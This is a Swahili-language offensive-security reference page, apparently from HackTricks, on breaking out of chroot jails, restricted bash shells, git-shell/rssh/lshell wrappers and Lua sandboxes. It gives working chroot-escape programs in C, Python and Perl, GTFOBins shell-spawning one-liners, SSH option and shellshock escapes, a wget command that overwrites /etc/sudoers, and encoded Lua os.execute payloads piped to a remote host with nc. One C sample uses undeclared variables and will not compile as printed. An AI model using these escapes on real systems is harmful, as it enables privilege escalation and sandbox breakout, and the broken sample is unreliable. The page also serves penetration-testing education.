# Kutoka kwenye Jails

## **GTFOBins**

**Tafuta katika** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ikiwa unaweza kutekeleza binary yoyote yenye property ya "Shell"**

## Kutoka kwenye Chroot

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haujakusudiwa kujilinda** dhidi ya kuchezewa kwa makusudi na **watumiaji wenye privileges** (**root**). Kwenye mifumo mingi, mazingira ya chroot hayapangwi vizuri kwa kufuatana, na programu za chroot **zenye privileges za kutosha zinaweza kutekeleza chroot ya pili ili kutoka nje**.\
Kwa kawaida hii inamaanisha kuwa ili kutoka unahitaji kuwa root ndani ya chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) iliundwa kutumia vibaya escenarios zifuatazo na kutoka kwenye `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Ikiwa wewe ni **root** ndani ya chroot, **unaweza kutoka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo pamoja (kwenye Linux), kwa hivyo ukiunda folder kisha **uunde chroot mpya** kwenye folder hiyo mpya huku **ukiwa nje yake**, sasa utakuwa **nje ya chroot mpya** na kwa hivyo utakuwa kwenye FS.
>
> Hii hutokea kwa sababu kwa kawaida chroot HAIHAMISHI working directory yako hadi kwenye iliyoonyeshwa, kwa hivyo unaweza kuunda chroot lakini ukawa nje yake.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa kawaida hutapata binary ya `chroot` ndani ya chroot jail, lakini **unaweza ku-compile, ku-upload na kutekeleza** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Hii ni sawa na hali ya awali, lakini katika hali hii **attacker huhifadhi file descriptor ya current directory** kisha **huunda chroot kwenye folder mpya**. Mwishowe, kwa kuwa ana **access** ya hiyo **FD** **nje** ya chroot, anaifikia na **anaescape**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD inaweza kupitishwa kupitia Unix Domain Sockets, kwa hiyo:
>
> - Unda child process (fork)
> - Unda UDS ili parent na child ziweze kuwasiliana
> - Endesha chroot kwenye child process katika folder tofauti
> - Katika parent proc, unda FD ya folder iliyo nje ya chroot mpya ya child proc
> - Pitisha FD hiyo kwa child procc ukitumia UDS
> - Child process itumie chdir kwenye FD hiyo, na kwa kuwa iko nje ya chroot yake, itaweza kutoroka kwenye jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Mount kifaa cha root (/) kwenye directory iliyo ndani ya chroot
> - Fanya chroot kwenye directory hiyo
>
> Hili linawezekana kwenye Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Mount procfs kwenye directory iliyo ndani ya chroot (ikiwa bado haijawekwa)
> - Tafuta pid iliyo na root/cwd entry tofauti, kama: /proc/1/root
> - Fanya chroot kwenye entry hiyo.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Unda Fork (child proc) na ufanye chroot kwenye folder tofauti iliyo ndani zaidi katika FS, kisha CD humo
> - Kutoka kwenye parent process, hamisha folder ambayo child process iko ndani yake hadi kwenye folder lililotangulia chroot ya children
> - Children process hii itajikuta nje ya chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Ikiwa process inaweza kuunganishwa kwa `ptrace` hutegemea credentials, capabilities, na security modules zilizowezeshwa kama Yama; kwa hiyo debugging ya mtumiaji yuleyule inaweza kuzuiwa na sera ya mfumo.<sup>[[8]](#references)</sup>
> - Ikiwa attachment inaruhusiwa, unaweza kutumia ptrace kuingia kwenye process na kutekeleza shellcode ndani yake ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Pata taarifa kuhusu jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Rekebisha PATH

Angalia ikiwa unaweza kurekebisha variable ya mazingira ya PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim

Ikiwa Vim inapatikana, weka chaguo lake la `shell` kuwa shell unayoweza kutekeleza na uendeshe `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers na help viewers

Mazingira mengi yenye vizuizi bado huacha **pagers** au **help viewers** zikipatikana. Kwa kawaida, ni rahisi kuzitumia vibaya kuliko kujaribu kujenga upya `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ikiwa `git` inapatikana, chaguo lake la `--paginate` hutuma matokeo kwa `less` au `$PAGER`, jambo linalofaa wakati pager escape inapatikana.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### one-liners za kawaida za GTFOBins

Ukishajua ni binaries zipi zinaweza kufikiwa, jaribu kwanza shell spawners zilizo dhahiri:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ikiwa unaweza tu **kuingiza arguments** kwenye command inayoruhusiwa (badala ya kuiendesha kwa uhuru), pia angalia **GTFOArgs**.<sup>[[17]](#references)</sup>

### Tengeneza script

Angalia kama unaweza kutengeneza faili inayoweza kutekelezwa yenye _/bin/bash_ kama maudhui yake
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kupitia SSH

Ikiwa unaingia kupitia ssh, mara nyingi unaweza kuomba seva itekeleze **programu tofauti** badala ya restricted login shell.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ikiwa `ssh` ni mojawapo ya binaries chache zinazoruhusiwa locally, kumbuka kwamba inaweza pia kutumiwa vibaya kama **GTFOBin**; chaguo zake za `LocalCommand` na `ProxyCommand` hutekeleza amri saidizi zilizosanidiwa locally.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Katika Bash, nameref huelekeza assignments kwenye variable nyingine, huku kuongeza element kwenye `BASH_CMDS` kukiongeza command hiyo kwenye command hash table ya ndani ya Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Chaguo la Wget la `-O` huandika maudhui yaliyopakuliwa kwenye faili ya pato lililotajwa; ikiwa njia hiyo inaweza kuandikiwa, hii inaweza kubadilisha faili kama vile `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Baadhi ya mazingira hayakuingizi kwenye `rbash` ya kawaida, bali kwenye **wrappers** kama `git-shell`, `rssh`, au `lshell`:

- `git-shell` hukubali tu Git commands za upande wa server pamoja na chochote kilichopo ndani ya `~/git-shell-commands/`. Ikiwa directory hiyo ipo, endesha `help` ili kuorodhesha custom actions zinazoruhusiwa. Ikiwa unaweza **kuandika** humo, executable yoyote utakayoweka kwenye directory hiyo itafikika.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` kwa kawaida huruhusu tu `scp`, `sftp`, `rsync`, au operations za mtindo wa Git. Katika hali hizo, lenga kwanza **file write primitives**: upload `authorized_keys`, shell startup file, au helper script kwenye location inayoweza kuandikwa, kisha uunganishe tena kwa `ssh -t ...`.
- Ikiwa wrapper inachuja tu command line, orodhesha binaries zinazofikika kisha pivot kurudi kwenye **GTFOBins / GTFOArgs**.

### Tricks nyingine

Pia angalia:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Ukurasa huu pia unaweza kuvutia:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks za kutoroka kutoka kwenye python jails zinapatikana kwenye ukurasa ufuatao:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Kwenye ukurasa huu unaweza kupata global functions unazoweza kufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Functions za kawaida za `load`, `string.char`, na `os.execute` zinaweza kujenga na kuendesha chunk hii zinapopatikana.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Kazi ya table pia inaweza kupatikana kwa `rawget` badala ya sintaksia ya nukta.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Tumia `pairs` kuorodhesha jedwali la library.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Mpangilio ambao `pairs` hutumia kuorodhesha table indices haujabainishwa, kwa hivyo usitegemee function fulani kuonekana kwanza. Ikiwa unahitaji kutekeleza function moja mahususi, unaweza kufanya brute force attack kwa kupakia lua environments tofauti na kuita function ya kwanza ya library.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata interactive lua shell**: Ikiwa uko ndani ya lua shell iliyo na mipaka, unaweza kupata lua shell mpya (na kwa matumaini isiyo na mipaka) kwa kuita `debug.debug()`, ambayo huingia katika hali ya interactive.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Jinsi ya Kutoka kwenye Suluhisho Mbalimbali za chroot (Bucsay Balazs, mazungumzo na slaidi za DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Mwongozo wa Marejeleo wa GNU Bash – Shell Iliyowekewa Vizuizi](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Nyaraka za Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – zana ya kutokea kwenye chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Nyaraka za Git](https://git-scm.com/docs/git)
- [10] [:shell – Nyaraka za Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Builtins za Bash – Mwongozo wa Marejeleo wa GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Vigezo vya Bash – Mwongozo wa Marejeleo wa GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Mwongozo wa GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – Ukurasa wa mwongozo wa OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – Ukurasa wa mwongozo wa OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Mwongozo wa Marejeleo wa Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Orodha ya Vekta za Exploitation ya Argument Injection](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
